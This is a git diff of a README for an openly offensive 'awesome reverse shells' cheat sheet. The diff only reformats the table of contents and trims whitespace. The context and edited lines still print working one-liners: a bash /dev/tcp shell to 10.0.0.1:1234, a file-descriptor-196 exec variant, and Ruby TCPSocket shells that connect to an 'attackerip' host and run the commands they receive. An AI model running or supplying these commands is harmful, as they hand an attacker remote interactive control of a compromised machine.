@@ -11,29 +11,29 @@
 
 A collection of awesome reverse shells in all many different languages!
 
-- [Awesome Reverse shells](#awesome-security)
-  - [Bash](#Bash)
-  	-[TCP](#Bash-TCP)
-  	-[UDP](#Bash-UDP)
-  - [Python](#Python)
-  	-[IPv4](#Python-IPv4)
-  	-[IPv6](#Python-IPv6)
-  	-[Windows](#Python-Windows)
-  - [Netcat](#Netcat)
-  - [Telnet](#Telnet)
-  - [PHP](#PHP)
-  - [Perl](#Perl)
-  	-[Linux](#Perl-Linux)
-  	-[Windows](#Perl-Windows)
-  - [Ruby](#Ruby)
-  	-[Linux](#Ruby-Linux)
-  	-[Windows](#Ruby-Windows)
-  - [Java](#Java)
-  - [XTERM](#XTERM)
-  - [GoLang](#GoLang)
-  - [powershell](#powershell)
-  - [SSL](#SSL)
-  - [AWK](#AWK)
+* [Awesome Reverse shells](#awesome-security)
+  * [Bash](#Bash)
+  	- [TCP](#Bash-TCP)
+  	- [UDP](#Bash-UDP)
+  * [Python](#Python)
+  	- [IPv4](#Python-IPv4)
+  	- [IPv6](#Python-IPv6)
+  	- [Windows](#Python-Windows)
+  * [Netcat](#Netcat)
+  * [Telnet](#Telnet)
+  * [PHP](#PHP)
+  * [Perl](#Perl)
+  	- [Linux](#Perl-Linux)
+  	- [Windows](#Perl-Windows)
+  * [Ruby](#Ruby)
+  	- [Linux](#Ruby-Linux)
+  	- [Windows](#Ruby-Windows)
+  * [Java](#Java)
+  * [XTERM](#XTERM)
+  * [GoLang](#GoLang)
+  * [powershell](#powershell)
+  * [SSL](#SSL)
+  * [AWK](#AWK)
 
 ## Bash
 #### Bash TCP
@@ -42,7 +42,7 @@ A collection of awesome reverse shells in all many different languages!
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
 ```bash
-     0<&196;exec 196<>/dev/tcp/10.0.0.1/1234; sh <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/10.0.0.1/1234; sh <&196 >&196 2>&196
 ```
 
 ```bash
@@ -136,7 +136,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 
 #### Ruby Windows
 ```ruby
-     ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
 
